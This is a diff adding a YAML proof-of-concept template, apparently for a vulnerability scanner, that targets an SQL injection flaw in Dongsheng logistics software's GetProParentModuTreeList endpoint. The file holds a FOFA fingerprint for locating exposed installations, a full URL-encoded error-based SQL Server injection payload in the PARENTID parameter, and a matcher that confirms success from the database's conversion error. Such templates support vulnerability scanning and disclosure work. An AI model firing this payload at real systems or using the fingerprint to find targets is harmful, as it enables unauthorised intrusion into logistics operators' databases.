@@ -1,0 +1,15 @@
+id: poc-yaml-dongshengsoft-getproparentmodutreelist-sqli
+info:
+  name: 东胜物流软件 GetProParentModuTreeList SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 东胜物流软件
+  fofa: fid="Z4c2hPCi5IR/AnH5vZXNSQ=="
+requests:
+- method: GET
+  path: /MvcShipping/MsBaseInfo/GetProParentModuTreeList?PARENTID=%27+AND+4757+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%284757%3D4757%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29+AND+%27KJaG%27%3D%27KJaG
+  expression: status_code == 200 && contains(body,"在将 varchar 值") && contains(body,"转换成数据类型
+    int 时失败") && contains(body,"qbzxq1qqbjq")
+variables: {}
+transport: http
